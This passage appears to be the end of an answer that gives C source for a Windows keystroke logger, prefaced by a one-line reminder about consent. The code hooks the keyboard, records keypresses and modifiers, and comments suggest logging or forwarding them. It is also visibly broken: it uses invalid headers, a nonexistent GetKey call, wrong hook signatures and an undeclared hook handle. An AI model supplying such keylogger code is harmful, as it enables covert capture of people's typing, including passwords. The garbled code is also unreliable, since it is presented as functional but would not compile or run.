   - **Ethical Use**: Ensure the application is used ethically and with proper user consent.

### Code

```c
#include <Windows.h>
#include <User32.h>
#include <tchar>

void CALLBACK KeyPress(int nCode, int wParam, int lParam) {
    if (wParam == WM_KEYDOWN) {
        static int lastKey = 0;
        static int lastModifier = 0;
        bool isKeyDown = true;
        bool isKeyUp = false;

        // Check if the key is a printable character
        int key = GetKey(nCode);
        if (key == 0) {
            return;
        }

        // Check for modifier states
        bool shiftDown = (lParam & 0x20) != 0;
        bool ctrlDown = (lParam & 0x10) != 0;
        bool altDown = (lParam & 0x40) != 0;

        // Determine if it's a key press or release
        if (wParam == WM_KEYDOWN) {
            isKeyDown = true;
            lastKey = key;
            lastModifier = (shiftDown || ctrlDown || altDown) ? 1 : 0;
        } else if (wParam == WM_KEYUP) {
            isKeyDown = false;
            // Release the key
        }

        // Record the key and modifiers
        if (isKeyDown) {
            // Store the key and modifiers
            // For example, append to a log file or send to another application
            // Example: Output the character and modifiers
            printf("Key: %s, Modifiers: %d\n", key, lastModifier);
        }
    } else if (wParam == WM_KEYUP) {
        // No action needed unless you need to track releases
    }
}

int main() {
    HWND hwnd = GetDesktopWindow();
    int hHook = SetWindowsHook(WH_KEYBOARD_LL, KeyPress);

    // Start capturing keystrokes
    // Add your logic here to handle the captured keystrokes
    // For example, store the keystrokes in a list or send them to a window
    // ... (Your additional code)

    UninstallHook();
    return 0;
}

void UninstallHook() {
    if (hHook) {
        UnhookWindowsHook(hHook, WH_KEYBOARD_LL);
        hHook = NULL;
    }
}
```

